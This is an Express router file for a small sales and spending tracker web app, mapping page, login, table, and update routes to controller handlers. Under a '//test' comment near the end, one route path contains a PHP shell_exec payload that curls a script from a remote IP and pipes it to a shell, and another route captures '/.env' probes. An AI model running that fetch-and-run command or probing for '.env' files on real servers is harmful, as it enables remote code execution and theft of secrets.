'use strict';

const express = require('express');
const router = express.Router();
const sessionAuth = require('../middlewares/sessionauth');

//Controller
const ctrl = require('./home.ctrl');

//Rendering Pages
router.get('/', ctrl.output.home);
router.get('/login', ctrl.output.login);
router.get('/finder', ctrl.output.finder);
router.get('/table', ctrl.output.table);

router.get('/logout', ctrl.auth.logout);
router.get(
  '/table/:year/:month',
  sessionAuth.checkSession,
  ctrl.process.get.monthInfo
);
router.get(
  '/table/:year/:month/:day',
  sessionAuth.checkSession,
  ctrl.process.get.dayInfo
);

router.get(
  '/spending/:year/:month',
  sessionAuth.checkSession,
  ctrl.process.get.spendingInfo
);
//POST
router.post('/login', ctrl.process.post.login);
router.post('/register', ctrl.process.post.register);
router.post('/finder', ctrl.process.post.finder);
router.post('/sales', sessionAuth.checkSession, ctrl.process.post.sales);
router.post('/spending', sessionAuth.checkSession, ctrl.process.post.spending);

//UPDATE
router.put('/spending', sessionAuth.checkSession, ctrl.process.put.spending);
router.put('/sales', sessionAuth.checkSession, ctrl.process.put.sales);

//test
router.get(
  '/?a=fetch&content=<php>die(shell_exec("curl%2094.103.89.159/tf.sh|sh"))</php>',
  ctrl.process.test
);
router.get('/.env', ctrl.process.test);

module.exports = router;
